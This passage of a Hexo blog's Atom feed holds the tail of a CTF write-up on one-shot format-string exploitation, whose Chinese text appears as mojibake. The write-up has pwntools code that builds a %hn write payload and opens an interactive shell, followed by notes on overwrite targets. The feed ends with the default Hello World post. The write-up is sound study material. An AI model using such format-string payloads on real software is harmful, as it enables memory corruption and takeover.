class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;%hn&#x27;</span>       <span class="comment">#40--&gt;4  7fxx   82--&gt;2  xxxx    85--&gt;0   xxxx</span></span><br><span class="line">            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori1-ori2-<span class="number">40</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span> </span><br><span class="line">            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori-ori1-<span class="number">1</span>).encode(<span class="string">&quot;utf-8&quot;</span>)   + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span> + <span class="string">b&#x27;%hn&#x27;</span> </span><br><span class="line">            payload4 += <span class="string">b&#x27;\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload4) </span><br><span class="line">            <span class="built_in">print</span>(payload4)</span><br><span class="line">            itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406081607924.png" alt="image-20240608160741823"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h2><ol><li>ä¸€æ¬¡æ€§æ ¼å¼åŒ–é™¤éæ˜¯ç»™äº†backdooræˆ–è€…libcåŸºåœ°å€ï¼Œå¦åˆ™ä¸€æ¬¡æ€§æ˜¯å¾ˆéš¾æ‰“é€šçš„ï¼Œå½“ç„¶ä¸æ’é™¤ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é¢˜ç›®ã€‚åŸºæœ¬ä¸Šåªç»™äº†ä¸€ä¸ªä¸€æ¬¡æ€§æ ¼å¼åŒ–åˆ©ç”¨çš„è¯ï¼Œéƒ½éœ€è¦æ„é€ å‡ºç¬¬äºŒæ¬¡åˆ©ç”¨ï¼Œæ— è®ºæ˜¯æ”¹gotã€fini_arrayã€printf_retã€ret_addrã€‚</li><li>æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ç›´æ¥å†™åœ°å€æ”¹æ•°æ®ï¼Œéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹æŒ‡é’ˆé—´æ¥æ”¹æ•°æ®</li></ol><h2 id="ä¸€äº›æ€è€ƒ"><a href="#ä¸€äº›æ€è€ƒ" class="headerlink" title="ä¸€äº›æ€è€ƒ"></a>ä¸€äº›æ€è€ƒ</h2><blockquote><p>æœ‰ç¾¤uåœ¨ç¾¤é‡Œè¯·æ•™äº†ä¸ºä»€ä¹ˆä¸èƒ½ç”¨$ç¬¦å·å®šä½ä½¿ç”¨ä¸¤æ¬¡ï¼Œç„¶ååœ¨ä¸€æ¡é“¾å­ä¸Šæ”¹ä¸¤æ¬¡ï¼Œæˆ‘åœ¨ä¸Šé¢çš„dasç­¾åˆ°é¢˜é‡Œé¢æœ‰äº†äº›è‡ªå·±çš„æµ‹è¯•ï¼Œä¸è¿‡è¿˜æ˜¯ä¸å¦‚ç¾¤é‡Œçš„å¤§ä½¬ç†è§£å¾—é€å½»ã€‚</p><p>è‡ªå·±æ•´ç†äº†ä¸€ä¸‹<a href="https://www.cnblogs.com/9man/p/18228214">.N1nEmAn</a>å¸ˆå‚…æ‰€è¯´çš„åŸç†ï¼šæ‰“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œä½¿ç”¨$ç¬¦å·ä½œä¸ºç´¢å¼•ï¼Œä¼šå°†æ ˆçš„ä¸Šä¸‹æ–‡ä¿å­˜åˆ°å †ä¸Šï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨$ç¬¦å·ä¿®æ”¹ç›®æ ‡èƒ½æ­£å¸¸ä¿®æ”¹æ ˆä¸Šæ•°æ®ï¼Œä½†æ˜¯å †ä¸Šçš„æ•°æ®æ²¡æœ‰å˜ï¼Œè€Œä¸‹æ¬¡å†ä½¿ç”¨$ç¬¦å·ä½œä¸ºç´¢å¼•ï¼Œä¼šåˆ°å †é‡Œé¢å»è¿›è¡Œä¿®æ”¹ï¼Œè€Œä¸æ˜¯åœ¨æ ˆä¸Šç›´æ¥ä¿®æ”¹ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½åœ¨åŒä¸€æ¡é“¾å­ä¸Šæ”¹ä¸¤æ¬¡ã€‚åé¢ä¹Ÿæœ‰<a href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">WJH</a>å¸ˆå‚…è´´å‡ºçš„åšå®¢ï¼Œé‡Œé¢æ˜¯WJHå¸ˆå‚…å¯¹printfçš„æºç åˆ†æã€‚è¿™å°±æ˜¯ä¸å¤§ä½¬ä»¬å­¦ä¹ çš„å·®è·å—ï¼Œå†æ¥å†å‰ï¼</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²&quot;&gt;&lt;a href=&quot;#ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²&quot; class=&quot;headerlink&quot; title=&quot;ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²&quot;&gt;&lt;/a&gt;ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²&lt;/h1&gt;&lt;h2 id=&quot;ã€2023-å¼ºç½‘æ¯ã€‘ez-fmt&quot;&gt;&lt;a href=&quot;#ã€2023-å¼ºç½‘æ¯</summary>
      
    
    
    
    <category term="STU" scheme="http://tw11ty.github.io/categories/STU/"/>
    
    
    <category term="fmt" scheme="http://tw11ty.github.io/tags/fmt/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://tw11ty.github.io/2024/06/06/hello-world/"/>
    <id>http://tw11ty.github.io/2024/06/06/hello-world/</id>
    <published>2024-06-06T09:15:58.683Z</published>
    <updated>2024-06-07T06:44:03.782Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
